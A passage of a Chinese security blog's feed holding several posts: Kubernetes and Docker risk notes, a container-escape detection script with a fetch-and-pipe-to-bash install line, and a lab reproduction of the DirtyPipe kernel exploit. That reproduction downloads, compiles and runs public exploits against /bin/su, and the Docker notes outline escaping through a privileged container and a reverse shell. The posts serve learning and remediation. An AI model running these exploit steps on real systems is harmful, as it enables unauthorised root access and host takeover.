    <content type="html"><![CDATA[<blockquote><p> 以下内容为自己个人的学习笔记，因此内容不会多么详实；其中有些内容也许会存在错误，如有错误欢迎留言处指出，还望谅解。</p></blockquote><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>Kubernetes 又称 k8s，是 Google 在 2014 年开源的一个用来管理容器的平台，以下是 k8s 架构图。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203211854408.png"></p><p>k8s 主要由以下核心组件组成：</p><ul><li>etcd 保存了整个集群的状态</li><li>API Server 提供了资源操作的唯一入口，并提供认证、授权、访问控制、API 注册和发现等机制</li><li>Controller Manager 负责维护集群的状态，比如故障检测、自动扩展、滚动更新等</li><li>Scheduler 负责资源的调度，按照预定的调度策略将 Pod 调度到相应的机器上</li><li>Kubelet 负责维护容器的生命周期，同时也负责Volume（CVI）和网络（CNI）的管理</li><li>Container Runtime 负责镜像管理以及 Pod 和容器的真正运行（CRI）</li><li>Kube-proxy 负责为 Service 提供 Cluster 内部的服务发现和负载均衡</li></ul><p>这里学习下 k8s 中所面临的一些风险，主要有 5 个部分：</p><p>1、容器基础设施存在的风险</p><p>2、组件接口存在的风险</p><p>3、集群网络存在的风险</p><p>4、访问控制机制存在的风险</p><p>5、自身的漏洞</p><p>其中容器基础设施存在的风险和之前分享的基本一致，这里主要看剩下的四种。</p><h1 id="0x01-组件接口存在的风险"><a href="#0x01-组件接口存在的风险" class="headerlink" title="0x01 组件接口存在的风险"></a>0x01 组件接口存在的风险</h1><h2 id="1、API-Server"><a href="#1、API-Server" class="headerlink" title="1、API Server"></a>1、API Server</h2><p>API Server 默认服务端口为 8080 和 6443，8080 端口提供 HTTP 服务，没有认证与授权机制，而 6443 提供 HTTP 服务，支持认证和授权服务。</p><p>默认情况下 8080 端口不启动，但如果用户开启了该服务，就会造成 API Server 的未授权访问，从而控制整个集群。</p><h2 id="2、Kubelet"><a href="#2、Kubelet" class="headerlink" title="2、Kubelet"></a>2、Kubelet</h2><p>与 API Server 类似，Kubelet 也运行着 API 服务，默认服务端口为 10250 和 10248</p><p>Kubelet 存在的风险主要也是未授权访问，如果 Kubelet 存在未授权访问，就可以控制所在节点的权限。</p><h2 id="3、Dashboard"><a href="#3、Dashboard" class="headerlink" title="3、Dashboard"></a>3、Dashboard</h2><p>Dashboard 默认端口为  8001，从 1.10.1 版本起，Dashboard 默认禁用了跳过按钮，但如果用户为了方便或者其他原因，开启了相关功能，就会导致 Dashboard 的未授权访问。</p><h2 id="4、etcd"><a href="#4、etcd" class="headerlink" title="4、etcd"></a>4、etcd</h2><p>etcd 默认监听 2379、2380 端口，前者用于客户端连接，后者用于多个 etcd 实例之间的通信。</p><p>默认情况下，etcd 提供的两个端口都需要相应的证书才能访问，但如果 RT 窃取了证书，或者用户将 etcd 设置了允许匿名问，那么 RT 就可以直接访问 etcd 并窃取数据。</p><p>由于 Kubernetes 集群内部的各种资源及其状态都存在 etcd 中，因此如果可以读取 etcd 的数据，就可能获得高权限，从而控制集群。</p><h1 id="0x03-集群网络存在的风险"><a href="#0x03-集群网络存在的风险" class="headerlink" title="0x03 集群网络存在的风险"></a>0x03 集群网络存在的风险</h1><p>Pod 是由一个或多个容器构成的集合，在没有其他网络隔离策略和 Pod 安全策略的默认情况下，由于 Pod 与 Pod 之间可以联通，且 Pod 内的 root 用户具有 CAP_NET_RAW 权限（即允许使用原始套接字的权限），因此集群内部可能会发生内网横向的风险。</p><h1 id="0x04-访问控制机制存在的风险"><a href="#0x04-访问控制机制存在的风险" class="headerlink" title="0x04 访问控制机制存在的风险"></a>0x04 访问控制机制存在的风险</h1><p>Kubernetes 中的访问控制机制主要由认证机制、授权机制和准入机制三个部分组成。</p><p>如果访问控制比较宽松或混乱或者允许 Kubernetes 的未授权访问，RT 可能借此直接获得集群管理员权限。</p><h1 id="0x05-无法根治的软件漏洞"><a href="#0x05-无法根治的软件漏洞" class="headerlink" title="0x05 无法根治的软件漏洞"></a>0x05 无法根治的软件漏洞</h1><p>Kubernetes 自身也被爆出许多安全漏洞，这类自然也属于 Kubernetes 所面临的的风险。</p><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p><p>参考资料：</p><p>《云原生安全-攻防实践与体系构建》</p><p><a href="https://www.jianshu.com/p/a7f6c4f420fa">https://www.jianshu.com/p/a7f6c4f420fa</a></p><p><a href="https://kubernetes.io/zh/docs/concepts/overview/what-is-kubernetes/">https://kubernetes.io/zh/docs/concepts/overview/what-is-kubernetes/</a></p><p><a href="https://www.kubernetes.org.cn/kubernetes%E8%AE%BE%E8%AE%A1%E6%9E%B6%E6%9E%84">https://www.kubernetes.org.cn/kubernetes%E8%AE%BE%E8%AE%A1%E6%9E%B6%E6%9E%84</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt; 以下内容为自己个人的学习笔记，因此内容不会多么详实；其中有些内容也许会存在错误，如有错误欢迎留言处指出，还望谅解。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;head</summary>
      
    
    
    
    <category term="云安全" scheme="https://www.teamssix.com/categories/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="云安全" scheme="https://www.teamssix.com/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    <category term="云原生" scheme="https://www.teamssix.com/tags/%E4%BA%91%E5%8E%9F%E7%94%9F/"/>
    
    <category term="笔记" scheme="https://www.teamssix.com/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="k8s" scheme="https://www.teamssix.com/tags/k8s/"/>
    
  </entry>
  
  <entry>
    <title>【工具分享】一个检测容器逃逸的脚本</title>
    <link href="https://www.teamssix.com/220318-164446.html"/>
    <id>https://www.teamssix.com/220318-164446.html</id>
    <published>2022-03-18T08:44:46.000Z</published>
    <updated>2022-03-18T09:03:35.004Z</updated>
    
    <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>最近搞了个检测 Docker 容器逃逸的脚本，目前支持以下几种方法的检测：</p><ol><li>处于特权模式</li><li>挂载了 Docker Socket</li><li>挂载了 Procfs</li><li>挂载了宿主机根目录</li><li>开启了 Docker 远程 API 访问接口</li><li>CVE-2016-5195 DirtyCow 脏牛漏洞</li><li>CVE-2020-14386 </li><li>CVE-2022-0847 DirtyPipe</li></ol><p>项目地址：<a href="https://github.com/teamssix/container-escape-check">https://github.com/teamssix/container-escape-check</a></p><p>感觉还不错的师傅们可以点个小星星 🌟</p><p>对于检测的原理可以看我写的这篇文章：<a href="https://zone.huoxian.cn/d/990">https://zone.huoxian.cn/d/990</a></p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>在 Docker 容器中一键运行：</p><pre class="line-numbers language-none"><code class="language-none">wget https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;teamssix&#x2F;container-escape-check&#x2F;main&#x2F;container-escape-check.sh | bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者克隆项目到容器中运行：</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;teamssix&#x2F;container-escape-check.gitcd container-escape-checkchmod +x container-escape-check.sh.&#x2F;container-escape-check.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203181518954.png"></p><h1 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h1><ul><li>这个脚本需要在 Docker 容器中运行</li><li>这里的检测方法大多是基于我自己的经验，可能会存在检测误检或者漏检的情况，如果您发现了这种情况，欢迎提 Issue</li><li>由于有的逃逸方法需要根据目标 Docker 的版本去判断，这里我暂时还没想到从容器内部获取 Docker 版本的方法，因此脚本暂时还不支持这块儿的检测。</li></ul><blockquote><p> 更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h1&gt;&lt;p&gt;最近搞了个检测 Docker 容器逃逸的脚本，目前支持以下几种方法的检测：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;处于特权模式&lt;/li&gt;
&lt;li&gt;挂载了</summary>
      
    
    
    
    <category term="工具分享" scheme="https://www.teamssix.com/categories/%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/"/>
    
    
    <category term="云安全" scheme="https://www.teamssix.com/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    <category term="容器" scheme="https://www.teamssix.com/tags/%E5%AE%B9%E5%99%A8/"/>
    
    <category term="容器逃逸" scheme="https://www.teamssix.com/tags/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/"/>
    
  </entry>
  
  <entry>
    <title>【漏洞复现】DirtyPipe CVE-2022-0847 Linux 内核提权漏洞复现</title>
    <link href="https://www.teamssix.com/220308-120008.html"/>
    <id>https://www.teamssix.com/220308-120008.html</id>
    <published>2022-03-08T04:00:08.000Z</published>
    <updated>2022-03-08T08:19:12.101Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>CVSS 评分：7.8</p><p>影响范围：5.8 &lt;= Linux 内核版本 &lt; 5.16.11 / 5.15.25 / 5.10.102</p><p>RT 通过 CVE-2022-0847 可覆盖重写任意可读文件中的数据，可将普通权限的用户提升到特权 root</p><p>这个漏洞作者将其命名为了 Dirty Pipe，一看到这名字讲道理就让人想到了 Dirty Cow，这是因为该漏洞的原理比较类似于 Dirty Cow，但这个漏洞更容易被利用。</p><h1 id="0x01-漏洞检测"><a href="#0x01-漏洞检测" class="headerlink" title="0x01 漏洞检测"></a>0x01 漏洞检测</h1><p>检测的方法很简单，直接 uname -r ，如果  5.8 &lt;= Linux 内核版本 &lt; 5.16.11 / 5.15.25 / 5.10.102 说明可能受到该漏洞的影响。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203081203032.png" alt="img"></p><h1 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h1><blockquote><p>建议在搭建环境前，先打好快照</p></blockquote><p>环境依赖：</p><ul><li>Ubuntu 16.04 或 18.04（推荐）</li><li>Python &gt;= 3.6 (不支持Python 2.x！)</li><li>pip3</li></ul><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;brant-ruan&#x2F;metarget.gitcd metarget&#x2F;pip3 install -r requirements.txtsudo .&#x2F;metarget cnv install cve-2022-0847<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203081202460.png" alt="img"></p><p>环境搭建好后，查看当前系统内核</p><pre class="line-numbers language-none"><code class="language-none">uname -r<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203081202399.png" alt="img"></p><p>可以看到系统内核已经是 5.8 的了，说明是可能受到该漏洞的影响了。</p><h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h1><h2 id="方法一：CVE-2022-0847-DirtyPipe-Exploit"><a href="#方法一：CVE-2022-0847-DirtyPipe-Exploit" class="headerlink" title="方法一：CVE-2022-0847-DirtyPipe-Exploit"></a>方法一：CVE-2022-0847-DirtyPipe-Exploit</h2><p>把 POC git 下来</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;Arinerron&#x2F;CVE-2022-0847-DirtyPipe-Exploitcd CVE-2022-0847-DirtyPipe-Exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>开始提权</p><pre class="line-numbers language-none"><code class="language-none">gcc exploit.c -o exploit.&#x2F;exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203081203539.png" alt="img"></p><p>我这里提示 su: must be run from a terminal，没提权成功。</p><p>根据作者的解释，他的电脑快没电了，所以暂时还没时间解决这个问题，这 ……</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203081203449.png" alt="img"></p><h2 id="方法二：dirtypipez-c"><a href="#方法二：dirtypipez-c" class="headerlink" title="方法二：dirtypipez.c"></a>方法二：dirtypipez.c</h2><p>后来看 p 牛说到了网上的其他 POC，下面这个 POC 测试了一下，是可以提权的</p><pre class="line-numbers language-none"><code class="language-none">mkdir dirtypipezcd dirtypipezwget https:&#x2F;&#x2F;haxx.in&#x2F;files&#x2F;dirtypipez.cgcc dirtypipez.c -o dirtypipez<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203081203441.png" alt="img"></p><p>这个 POC 需要事先找到一个具有 SUID 权限的可执行文件，然后利用这个文件进行提权</p><p>使用以下命令可以找到这类文件</p><pre class="line-numbers language-none"><code class="language-none">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203081204857.png" alt="img"></p><p>这里就以 /bin/su 为例了，直接 ./dirtypipez 跟上具有 SUID 权限的文件即可提权</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;dirtypipez &#x2F;bin&#x2F;su <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203081204783.png" alt="img"></p><h1 id="0x04-漏洞修复"><a href="#0x04-漏洞修复" class="headerlink" title="0x04 漏洞修复"></a>0x04 漏洞修复</h1><p>更新升级 Linux 内核到以下安全版本：</p><ul><li>Linux 内核 &gt;= 5.16.11</li><li>Linux 内核 &gt;= 5.15.25</li><li>Linux 内核 &gt;= 5.10.102</li></ul><blockquote><p>参考文章：</p><p><a href="https://t.zsxq.com/imaqj2V">https://t.zsxq.com/imaqj2V</a></p><p><a href="https://mp.weixin.qq.com/s/b8DmtIerXuoC7f3nqaOVIw">https://mp.weixin.qq.com/s/b8DmtIerXuoC7f3nqaOVIw</a></p><p><a href="https://access.redhat.com/security/cve/cve-2022-0847">https://access.redhat.com/security/cve/cve-2022-0847</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;CVSS 评分：7.8&lt;/p&gt;
&lt;p&gt;影响范围：5.8 &amp;lt;= Linux 内核版本 &amp;lt; </summary>
      
    
    
    
    <category term="漏洞复现" scheme="https://www.teamssix.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="https://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="提权漏洞" scheme="https://www.teamssix.com/tags/%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="Linux" scheme="https://www.teamssix.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>【云安全】容器基础设施所面临的风险学习</title>
    <link href="https://www.teamssix.com/220307-162000.html"/>
    <id>https://www.teamssix.com/220307-162000.html</id>
    <published>2022-03-07T08:20:00.000Z</published>
    <updated>2022-03-07T08:29:22.488Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>以下内容为自己个人的学习笔记，因此内容不会多么详实；其中有些内容也许会存在错误，如有错误欢迎留言处指出，还望谅解。</p></blockquote><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这里以 Docker 为例，来学习学习容器基础设施中存在的一些风险问题。</p><p>下图是 Docker 官方给出的架构图，里面包括了 Docker 客户端、Docker 容器所在的宿主机和 Docker 镜像仓库三个部分。</p><p>其中宿主机包括了 Docker 守护进程、本地容器和本地镜像，Docker 守护进程（dockerd）的作用是侦听 Docker API 请求和管理 Docker 对象。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203071618942.png"></p><h1 id="0x01-容器镜像存在的风险"><a href="#0x01-容器镜像存在的风险" class="headerlink" title="0x01 容器镜像存在的风险"></a>0x01 容器镜像存在的风险</h1><h2 id="1、不安全的第三方组件"><a href="#1、不安全的第三方组件" class="headerlink" title="1、不安全的第三方组件"></a>1、不安全的第三方组件</h2><p>例如开发者在代码中引入了存在漏洞版本的 log4j2 组件，然后将其打包成了业务镜像。这样即使代码没有漏洞，但因为引入了不安全的第三方组件也变得有漏洞了。</p><p>再比如开发者在 Django 镜像的基础上，编写了自己的 Python 代码，然后将其打包成镜像。这样如果在  Django 镜像里引用了不安全的第三方组件或者 Django 自身存在漏洞，自己打包的镜像也同样会受到影响。</p><h2 id="2、不安全的镜像"><a href="#2、不安全的镜像" class="headerlink" title="2、不安全的镜像"></a>2、不安全的镜像</h2><p>在公共镜像仓库比如 Docker Hub 里，会存在一些有漏洞的镜像或者恶意镜像，如果使用了这些镜像那就存在风险了。</p><h2 id="3、敏感信息泄露"><a href="#3、敏感信息泄露" class="headerlink" title="3、敏感信息泄露"></a>3、敏感信息泄露</h2><p>如果开发者为了开发、调试方便，可能会将数据库账号密码、云服务密钥之类的敏感数据打包到了镜像里，那别人获取到这个镜像后，就会导致敏感信息泄露了。</p><h1 id="0x02-活动中的容器存在的风险"><a href="#0x02-活动中的容器存在的风险" class="headerlink" title="0x02 活动中的容器存在的风险"></a>0x02 活动中的容器存在的风险</h1><h2 id="1、不安全的容器应用"><a href="#1、不安全的容器应用" class="headerlink" title="1、不安全的容器应用"></a>1、不安全的容器应用</h2><p>在使用容器时，往往会需要进行端口映射，比如把 MySQL 的 3306 端口映射出来，如果 MySQL 被配置了弱密码，那就存在被利用的风险了。</p><p>除此之外，如果一个 Web 服务端口被映射出来，同时这个 Web 服务存在漏洞，那么也同样是存在风险的。</p><h2 id="2、不受限制的资源共享"><a href="#2、不受限制的资源共享" class="headerlink" title="2、不受限制的资源共享"></a>2、不受限制的资源共享</h2><p>容器运行在宿主机上，容器必然要使用宿主机的各种 CPU、内存等资源，如果没有对容器进行资源使用限制，那么就存在宿主机被资源耗尽的风险。</p><h2 id="3、不安全的配置与挂载"><a href="#3、不安全的配置与挂载" class="headerlink" title="3、不安全的配置与挂载"></a>3、不安全的配置与挂载</h2><p>如果为容器设定了不安全的配置，会导致容器本身的隔离机制失效，容器的两大隔离机制如下：</p><ul><li>Linux 命名空间（NameSpace）：实现文件系统、网络、进程、主机名等方面的隔离</li><li>Linux 控制组（cgroups）：实现 CPU、内存、硬盘等方面的隔离</li></ul><p>如果设定了以下配置就会导致相应的隔离机制失效：</p><ul><li><p>–privileged：使容器内的 root 权限和宿主机上的 root 权限一致，权限隔离被打破</p></li><li><p>–net=host：使容器与宿主机处于同一网络命名空间，网络隔离被打破</p></li><li><p>–pid=host：使容器与宿主机处于同一进程命令空间，进程隔离被打破</p></li><li><p>–volume /:/host：宿主机根目录被挂载到容器内部，文件系统隔离被打破</p></li></ul><h1 id="0x03-容器管理程序接口的风险"><a href="#0x03-容器管理程序接口的风险" class="headerlink" title="0x03 容器管理程序接口的风险"></a>0x03 容器管理程序接口的风险</h1><p>Docker 守护进程主要监听 UNIX socket 和 TCP socket，默认情况下，Docker 只会监听 UNIX socket</p><h2 id="1、UNIX-socket"><a href="#1、UNIX-socket" class="headerlink" title="1、UNIX socket"></a>1、UNIX socket</h2><p>UNIX socket 的风险主要在于 Docker 守护进程默认以宿主机的 root 权限运行，因此就可以借助这点进行提权或者容器逃逸。</p><p>这类风险主要有两个利用场景：</p><ul><li>普通用户被加到 Docker 用户组内</li></ul><p>如果普通用户被加入到 Docker 用户组内，那么普通用户也将有权限访问 Docker UNIX socket，如果攻击者获得了这个普通用户权限，就可以借助 Docker 提权到 root 用户权限。</p><p>具体的做法可以简单描述为：使用普通用户创建一个 privileged 为 true 的容器，在该容器内挂载宿主机硬盘并写入定时任务，然后将宿主机的 root 权限反弹回来，后期将详细介绍这种方法的使用。</p><ul><li>UNIX socket 挂载到容器内部</li></ul><p>有时为了实现容器内部管理容器，可能会将 Docker UNIX socket 挂载到容器内部，那么如果该容器被入侵，RT 就可以借助这个 socket 进行容器逃逸获得宿主机 root 权限。 </p><h2 id="2、TCP-socket"><a href="#2、TCP-socket" class="headerlink" title="2、TCP socket"></a>2、TCP socket</h2><p>现在 Docker 守护进程默认不会监听 TCP socket，不过有时可能用户会因为方便开启 TCP socket 的监听，一般默认监听端口是 2375</p><p>默认情况下，Docker 守护进程 TCP socket 是无加密无认证的，因此如果发现宿主机 Docker 开放了 TCP socket，就可以直接使用 docker -H 接管目标的容器</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203071618407.png"></p><h1 id="0x04-其他风险"><a href="#0x04-其他风险" class="headerlink" title="0x04 其他风险"></a>0x04 其他风险</h1><h2 id="1、容器网络风险"><a href="#1、容器网络风险" class="headerlink" title="1、容器网络风险"></a>1、容器网络风险</h2><p>虽然默认情况下，容器内部的网络与宿主机是隔离的，但是每个容器之间是彼此互相连通的，理论上在容器之间是存在内网横向的风险的。</p><h2 id="2、宿主机操作系统风险"><a href="#2、宿主机操作系统风险" class="headerlink" title="2、宿主机操作系统风险"></a>2、宿主机操作系统风险</h2><p>容器通常与宿主机共享内核，也就是说如果宿主机内核存在漏洞，意味着容器可能也会存在相同的漏洞。</p><p>例如如果宿主机存在脏牛漏洞，那么拿到容器权限后，使用脏牛漏洞就可以获得宿主机权限，实现容器逃逸。</p><h2 id="3、软件自身的漏洞"><a href="#3、软件自身的漏洞" class="headerlink" title="3、软件自身的漏洞"></a>3、软件自身的漏洞</h2><p>Docker 自身存在的一些漏洞，比如 CVE-2019-14271、CVE-2019-5736 等都可以导致容器逃逸，这些也都是风险点，后面会对这些漏洞进行尝试复现。</p><blockquote><p> 更多信息欢迎关注我的微信公众号：TeamsSix</p><p> 参考资料：</p><p> 《云原生安全-攻防实践与体系构建》</p><p> <a href="https://docs.docker.com/get-started/overview/">https://docs.docker.com/get-started/overview/</a></p><p> <a href="https://www.freebuf.com/articles/web/258398.html">https://www.freebuf.com/articles/web/258398.html</a></p><p> <a href="https://cloud.tencent.com/developer/article/1428102">https://cloud.tencent.com/developer/article/1428102</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;以下内容为自己个人的学习笔记，因此内容不会多么详实；其中有些内容也许会存在错误，如有错误欢迎留言处指出，还望谅解。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;heade</summary>
      
    
    
    
    <category term="云安全" scheme="https://www.teamssix.com/categories/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="云安全" scheme="https://www.teamssix.com/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    <category term="云原生" scheme="https://www.teamssix.com/tags/%E4%BA%91%E5%8E%9F%E7%94%9F/"/>
    
    <category term="笔记" scheme="https://www.teamssix.com/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="容器" scheme="https://www.teamssix.com/tags/%E5%AE%B9%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>【云安全】云原生安全是什么？</title>
    <link href="https://www.teamssix.com/220217-160755.html"/>
    <id>https://www.teamssix.com/220217-160755.html</id>
    <published>2022-02-17T08:07:55.000Z</published>
    <updated>2022-02-17T08:19:31.809Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近在接触云原生安全的时候碰到了不少以前不知道、不熟悉的名词、技术等等，故在此做个笔记记录一下。</p><h1 id="0x01-一些名词介绍"><a href="#0x01-一些名词介绍" class="headerlink" title="0x01 一些名词介绍"></a>0x01 一些名词介绍</h1><h2 id="容器编排"><a href="#容器编排" class="headerlink" title="容器编排"></a>容器编排</h2><p>容器编排（Container Orchestration）是指自动化容器的部署、管理、扩展和联网，容器编排可以为需要部署和管理成百上千个 Linux 容器和主机的企业提供便利。</p><p>常见的容器编排工具方案有 Kubernetes、Docker Swarm 和 Apache Mesos 等。</p><p>以下是 Sysdig 在 2021 年给出的容器编排工具流行度图表，可以看到 Kubernetes 可谓是一骑绝尘。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202202171557036.png"></p><p>图片来源：<a href="https://dig.sysdig.com/c/pf-2021-container-security-and-usage-report?x=u_WFRi&amp;utm_source=gated-organic&amp;utm_medium=website">https://dig.sysdig.com/c/pf-2021-container-security-and-usage-report?x=u_WFRi&amp;utm_source=gated-organic&amp;utm_medium=website</a></p><h2 id="无服务"><a href="#无服务" class="headerlink" title="无服务"></a>无服务</h2><p>无服务（Serverless）是一种云原生开发模型，可使开发人员专注构建和运行应用，这并不是说没有服务器，而是说开发者不用去管服务器只负责开发就行。</p><p>无服务计算产品通常被分为两类，分别是后端即服务（BaaS）和函数即服务（FaaS），其中 FaaS 是 Serverless 的主要实现方式，FaaS 的相关产品主要有 AWS 的 Lambda、Azure 的  Functions Serverless Compute、GCP 的 Firebase Cloud Functions、阿里云的 Function Compute 等。</p><h2 id="微服务"><a href="#微服务" class="headerlink" title="微服务"></a>微服务</h2><p>微服务（Microservices）是一种软件架构风格，它是以专注于单一责任与功能的小型功能区块为基础，利用模块化的方式组合出复杂的大型应用程序，各功能区块使用与语言无关的API集相互通信。</p><p>这个是 Wiki 上给出的定义，如果具体的想了解微服务是什么可以看知乎上的这个帖子：<a href="https://www.zhihu.com/question/65502802">https://www.zhihu.com/question/65502802</a></p><h2 id="服务网格"><a href="#服务网格" class="headerlink" title="服务网格"></a>服务网格</h2><p>服务网格（Service Mesh）用于控制应用的不同部分之间如何共享数据，服务网格内置于应用程序中的专用基础架构层，这个可见的基础架构层可以记录应用的不同部分是否能正常交互。</p><p>在服务网格中，请求将通过所在基础架构层中的代理在微服务之间路由，构成服务网格的各个代理有时被称为”sidecar”</p><p>如果没有服务网格，每项微服务都需要进行逻辑编码，才能管理服务间通信，这会导致开发人员无法专注于业务目标，同时，这也意味着通信故障难以诊断，因为管理服务间通信的逻辑隐藏在每项服务中。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202202171557782.png"></p><h2 id="CNCF"><a href="#CNCF" class="headerlink" title="CNCF"></a>CNCF</h2><p>CNCF (Cloud Native Computing Foundation) 云原生计算基金会，于 2015 年7月21日成立，隶属于 Linux 基金会，CNCF 的口号是坚持和整合开源技术来编排容器作为微服务架构的一部分。</p><p>CNCF 是一个孵化、运营云原生生态的中立组织，CNCF 对于云原生应用的推广和普及发挥着重要的作用。</p><p>在 landscape.cncf.io 可以看到由 CNCF 所维护的云原生全景图。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202202171558254.png"></p><h1 id="0x02-云原生安全"><a href="#0x02-云原生安全" class="headerlink" title="0x02 云原生安全"></a>0x02 云原生安全</h1><h2 id="云原生"><a href="#云原生" class="headerlink" title="云原生"></a>云原生</h2><p>云原生（Cloud Native）可以拆分成「云」和「原生」去看。</p><p>「云」相对的就是本地，传统应用都跑在本地服务器上，而云则表示跑在云服务器上。</p><p>「原生」则可以简单的理解成出生地的意思，放在云环境中所表达的意思就是：在把应用跑到云服务器上时，应该充分的利用云自身的特点，比如弹性和分布式优势。</p><p>如果只是简单的把原来本地跑的业务放到云上，高举“上云”大旗，那只能叫做“拆迁户”，不能叫做云原生；当“上云”的风潮过去后，开始出现了直接就部署在云上的业务，这些业务完全按照“云”的特点去设计，这种是“云”的原住民，可以叫做云原生。</p><p>CNCF 对于云原生的见解为：</p><p>云原生技术有利于各组织在公有云、私有云和混合云等新型动态环境中，构建和运行可弹性扩展的应用。云原生的代表技术包括容器、服务网格、微服务、不可变基础设施和声明式 API。</p><p>这些技术能够构建容错性好、易于管理和便于观察的松耦合系统。结合可靠的自动化手段，云原生技术使工程师能够轻松地对系统作出频繁和可预测的重大变更。</p><p>对于云原生系统一般有以下特征：</p><ul><li><p>轻、快、不变的基础设施</p></li><li><p>弹性服务编排</p></li><li><p>开发运营一体化</p></li><li><p>微服务架构</p></li><li><p>无服务模型</p></li></ul><h2 id="云原生安全"><a href="#云原生安全" class="headerlink" 